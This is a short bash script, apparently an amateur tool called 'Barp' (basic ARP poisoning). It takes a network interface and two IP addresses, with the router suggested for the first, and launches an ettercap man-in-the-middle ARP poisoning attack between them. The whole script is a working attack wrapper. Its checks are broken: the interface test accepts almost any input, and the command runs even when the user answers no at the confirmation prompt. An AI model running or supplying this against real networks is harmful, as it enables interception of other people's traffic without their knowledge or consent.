#!/bin/bash

# You will need ettercap for this script to work ; to install 'sudo apt install ettercap'
# i also recommend wire shark (wireshark) ; to install 'sudo apt install wireshark'
# you night want nmap so run 'sudo apt install nmap'
# Barp means 'Basic arp poisoning'

echo "enter an interface"

read INFCE

if [ "$INFCE" != "${INFCE#[ wlan0, lo, arc_ns0, arc_ns1, vetharc0, arc_br0, arc_wlan0, vethwlan0, arc_ns2 ]}" ]; then
        echo "enter first ip (Deemon recos the router ip)"
        read IP1
else
        echo "invalid"
        sleep 0.30
        echo "BYE!"
        exit
fi
# if you put in scrible or just random stuff, it will read it so know what you are doing

echo "enter second ip"

read IP2

echo "do you really want to run this command (Y or n)"
read A

if [ "$A" != "${A#[Yy]}" ]; then
      echo "Running your command now"
else
      echo "exiting"
fi

sudo ettercap -T -S -i $INFCE -M arp:remote /$IP1// /$IP2//

# finished in 10 mins
# 36 lines with no test
